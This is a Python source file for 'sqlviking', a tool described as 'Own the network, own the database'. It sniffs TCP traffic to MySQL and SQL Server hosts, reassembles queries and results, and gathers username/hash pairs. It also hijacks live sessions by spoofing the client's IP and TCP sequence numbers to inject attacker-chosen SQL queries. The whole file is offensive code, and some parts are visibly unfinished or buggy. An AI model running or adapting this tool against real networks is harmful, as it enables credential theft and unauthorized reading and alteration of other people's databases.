from os import walk
from operator import itemgetter
from scapy.all import *
import sys, getopt, re, argparse, threading, datetime
sys.path.append("databases/")
from constantvalues import *
#import constantvalues
import mysql,sqlserver,Queue

dbQueue1 = Queue.Queue()
dbQueue2 = Queue.Queue()
injectionQueue = Queue.Queue()
pktQueue = Queue.Queue()

settings = {}
DATABASELIST = {'MYSQL':mysql.MySqlDB(), 'SQLSERV':sqlserver.SqlServerDB()}

class Conn():
    def __init__(self,cip,cport,sip,sport,state,db,nextcseq=-1,nextsseq=-1):
        self.cip      = cip # client ip
        self.cport    = cport
        self.sip      = sip # server ip
        self.sport    = sport
        self.db       = db
        self.frag     = []
        self.state    = state
        self.nextcseq = nextcseq
        self.nextsseq = nextsseq
        self.currentUser = ''
        self.currentInstance = ''

    def setInstance(self,inst):
        self.currentInstance = inst
        if inst not in self.db.instances:
            self.db.instances[inst] = []

class Database():
    def __init__(self,dbType,ip,port):
        self.ip          = ip
        self.port        = port
        self.dbType      = dbType
        self.traffic     = []
        self.credentials = [] # username/hash pairs
        self.instances   = {} # 'appnameDb' : [Table(), Table()]

    def addUser(self,u):
        if u not in self.users:
            self.users.append(u)

    def status(self):
        return None

    def getTraffic(self,mode):
        if mode == HUMAN:
            resp = '%s%s@%s:%s%s\n\n'%('-'*20,self.dbType,self.ip,self.port,'-'*20)
            resp += 'Credentials:\n'
            if len(self.credentials)>0:
                for u,p in self.credentials:
                    resp += '\t%s : %s\n'%(u,p)
            else:
                resp += 'No credentials harvested\n'
            resp += '\nTraffic:\n'
            for t in self.traffic:
                resp += '\n--Timestamp--\n%s\n'%t.timestamp
                resp += '--Request--\n'
                for q in t.query:
                    resp += '%s\n'%q
                resp += '--Response--\n'
                for r in t.result:
                    resp += '%s\n'%r
            return resp

    def addInstance(self,schema):
        return

class Traffic():
    def __init__(self,query=None,result=None,instance=None):
        self.query = query
        self.result = result
        self.timestamp = datetime.datetime.now()
        self.instance = instance

#store table specific info such as columns and associated attributes
class Table():
    def __init__(self,name,db):
        return

class Scout(threading.Thread):
    def __init__(self,interface="eth0"):
        threading.Thread.__init__(self)
        self.knownDatabases = []
        self.die = False
        self.interface = interface

    def run(self):
        lfilter = lambda (r): TCP in r
        while not self.die:
            while not dbQueue2.empty():
                self.knownDatabases.append(dbQueue2.get())
            try:
                sniff(prn=pktQueue.put,filter="tcp",store=0,timeout=5,iface=self.interface)
                #sniff(prn=self.putPkt,filter="tcp",store=0,timeout=5,iface=self.interface)
            except:
                print sys.exc_info()[1]
                self.die = True

    #for debugging, offloaded logic into Parse.getConn() func to keep from bogging down this thread
    #def putPkt(self,pkt):
    #    for db in self.knownDatabases:
    #        if (pkt[IP].src == db.ip and pkt[TCP].sport == db.sport) or (pkt[IP].dst == db.ip and pkt[TCP].dport == db.port):
    #            pktQueue.put(pkt)

class Parse(threading.Thread):
    def __init__(self,interface="eth0",debug=False):
        threading.Thread.__init__(self)
        self.die = False
        self.toInject = []
        self.knownDatabases = []
        self.knownConns = []
        self.fingerprint = False
        self.interface = interface
        self.debug = debug

    def dprint(self,s):
        if self.debug == 'True':
            print(s)

    def run(self):
        global dbQueue1,injectionQueue,pktQueue
        while not self.die:
            while not dbQueue1.empty():
                self.knownDatabases.append(dbQueue1.get())
            while not injectionQueue.empty():
                self.toInject.append(injectionQueue.get())
            if not pktQueue.empty():
                self.handle(pktQueue.get())
        for db in self.knownDatabases:
            print db.getTraffic(HUMAN)

    def getConn(self,pkt):
        for c in self.knownConns:
            if pkt[IP].src  == c.cip and pkt[IP].dst == c.sip and pkt[TCP].sport == c.cport and pkt[TCP].dport == c.sport: #is req
                #self.dprint('[?] pkt is req of known conn')
                return c
            elif pkt[IP].src == c.sip and pkt[IP].dst == c.cip and pkt[TCP].sport == c.sport and pkt[TCP].dport == c.cport: #is resp
                # self.dprint('[?] pkt is resp of known conn')
                return c

        for db in self.knownDatabases:
            if pkt[IP].src == db.ip and pkt[TCP].sport == db.port: #new resp
                #self.dprint('[?] pkt is resp; creating new conn')
                c = Conn(cip=pkt[IP].dst,cport=pkt[TCP].dport,sip=db.ip,sport=db.port,state=None,db=db)
                self.knownConns.append(c) 
                return c
            elif pkt[IP].dst == db.ip and pkt[TCP].dport == db.port: #new req
                #self.dprint('[?] pkt is req; creating new conn')
                c = Conn(cip=pkt[IP].src,cport=pkt[TCP].sport,sip=db.ip,sport=db.port,state=None,db=db)
                self.knownConns.append(c) 
                return c

        if self.fingerprint:
            return #todo

    def parse(self,conn):
        payload = ''
        for p in conn.frag:
            payload += str(p[TCP].payload)

        if conn.frag[0][IP].src == conn.sip and conn.frag[0][TCP].sport == conn.sport: #is response
            self.store(DATABASELIST[conn.db.dbType].parseResp(payload,conn),RESPONSE,conn)
        else: #is request
            self.store(DATABASELIST[conn.db.dbType].parseReq(payload,conn),REQUEST,conn)

        conn.frag = []

    #TODO: revamp this to leverage error handling methods for adding traffc instead of appending to array
    def store(self,data,pktType,conn):
        if pktType==RESPONSE and len(conn.db.traffic) > 0 and conn.db.traffic[-1].result == None: #is result
            conn.db.traffic[-1].result = data
        elif pktType==RESPONSE: #is result, missed query
            conn.db.traffic.append(Traffic(result=data))
        else: #is query
            conn.db.traffic.append(Traffic(query=data))

    def handle(self,pkt):
        #even with TCP filter set on scapy, will occassionally get packets
        #with no TCP layer. throws exception and breaks thread.
        pkts = []
        try:
            pkt[TCP]
        except:
            return
        
        c  = self.getConn(pkt)
        if c is None:
            return

        if pkt[TCP].flags == 24: #don't inject after fragged pkt, we'll lose that race
            for i in self.toInject: 
                #self.printLn("[1] %s %s %s %s %s %s"%(c.db.ip,i[1],c.db.port,i[2],pkt[TCP].sport,pkt[TCP].flags))
                if c.db.ip == i[1] and c.db.port == i[2] and pkt[TCP].sport == i[2]: #make sure to inject after db response to increase likelihood of success
                    self.printLn("[2] attempting injection")
                    #self.printLn(databaseList[c.db.dbType].encodeQuery(i[0]).encode('hex'))
                    #sendp(Ether(dst=pkt[Ether].src,src=pkt[Ether].dst)/IP(dst=i[1],src=c.cip)/TCP(sport=c.cport,dport=i[2],flags=16,seq=c.nextcseq,ack=pkt[TCP].seq+len(pkt[TCP].payload)))
                    sendp(Ether(dst=pkt[Ether].src,src=pkt[Ether].dst)/IP(dst=i[1],src=c.cip)/TCP(sport=c.cport,dport=i[2],flags=24,seq=c.nextcseq,ack=pkt[TCP].seq+len(pkt[TCP].payload))/DATABASELIST[c.db.dbType].encodeQuery(i[0]),iface=self.interface)
                    self.nject.remove(i)

        #check for control packets
        if pkt[TCP].flags == 17: #FIN/ACK pkt
            self.knownConns.remove(c)
            return
        elif pkt[TCP].flags == 2: #SYN pkt
            c.nextcseq = pkt[TCP].seq+1
            return
        
        #TODO: invesitgate this further; are these ACK pkts?
        #empty pkt, no reason to parse. scapy sometimes returns empty pkts with [tcp].payload of several '0' values
        if len(pkt[TCP].payload) == 0 or (len(pkt[TCP].payload) <= 16 and str(pkt[TCP].payload).encode('hex') == '00'*len(pkt[TCP].payload)): 
            return
        
        # this destroys any kind of out-of-order fault tolerance. 
        #if pkt[IP].src == c.cip and pkt[TCP].sport == c.cport and c.nextcseq != -1 and c.nextcseq != pkt[TCP].seq: #is a bad req
        #    return
        #elif pkt[IP].dst == c.cip and pkt[TCP].dport == c.cport and c.nextsseq != -1 and c.nextsseq != pkt[TCP].seq: #is a bad resp
        #    return

        """if (pkt[TCP].flags >> 3) % 2 == 0: #PSH flag not set, is a fragged pkt. this breaks on data sent over lo interface. scapy does not seem to handle len(pkt)>MTU well. 
            c.frag.append(pkt)
        else:
            if len(c.frag) > 0:
                for p in c.frag:
                    pkts.append(p)
                c.frag = []
            pkts.append(pkt)
            if c.db != UNKNOWN:
                self.parse(pkts,c)"""

        #this is much cleaner than the method above. can probably still be cleaned up more. does parse need the conn obj?
        c.frag.append(pkt)
        if (pkt[TCP].flags >> 3) % 2 == 0:
            return
        self.parse(c)

        if pkt[IP].src == c.cip and pkt[TCP].sport == c.cport:
            c.nextcseq = len(pkt[TCP].payload)+pkt[TCP].seq
        else:
            c.nextsseq = len(pkt[TCP].payload)+pkt[TCP].seq

def dprint(s):
    global settings
    if settings['debug']:
        print(s)

def parseConfig(f):
    global dbs,toInject
    settings = {}
    DATABASES = 0
    INJECTION = 1
    DATA = 2
    MISC = 3

    flag = -1
    with open(f,'r') as f:
        for l in f:
            l = l.strip().split('#')[0]
            if len(l) == 0:
                continue #donothing
            elif '[Databases]' in l:
                flag = DATABASES
            elif '[Injection]' in l:
                flag = INJECTION
            elif '[Data]' in l:
                flag = DATA
            elif '[Misc]' in l:
                flag = MISC
            elif flag == DATABASES:
                l = l.split(':')
                #dprint('[?] Parsing line for db info:\t%s'%l)
                dbQueue1.put(Database(l[0],l[1].strip(),int(l[2])))
                dbQueue2.put(Database(l[0],l[1],l[2]))
            elif flag == INJECTION:
                injectionQueue.put(l)
            elif flag == DATA:
                l = l #do nothing for know, leave check so i remember to update later when stuff is actually implemented
            elif flag == MISC:
                settings[l.split('=')[0].strip()] = l.split('=')[1].strip()

    return settings

def main():
    global settings

    parser = argparse.ArgumentParser(description='Own the network, own the database', prog='sqlviking.py', usage='%(prog)s [-v] -c <config file location>', formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=65, width =150))
    parser.add_argument('-v', '--verbose', action='store_true', help='Turn on verbose mode; will print out all captured traffic')
    parser.add_argument('-c', '--configfile', default='sqlviking.conf', help='Config file location, defaults to sqlviking.conf')
    args = parser.parse_args()

    try:
        settings = parseConfig(args.configfile)
    except IOError:
        print('[!] Error reading config file. Exiting...')
        sys.exit(0)

    t1 = Scout(settings['interface'])
    t2 = Parse(interface=settings['interface'],debug=settings['debug'])
    t1.start()
    t2.start()

    #printMainMenu(t2)
    try:
        while True:
            a = 1
        #nonBlockingRawInput(t2)
    except KeyboardInterrupt:
        print('\n[!] Shutting down...')
        t1.die = True
        t2.die = True
    except:
        t1.die = True
        t2.die = True
        print sys.exc_info()[1]

if __name__ == "__main__":
    main()
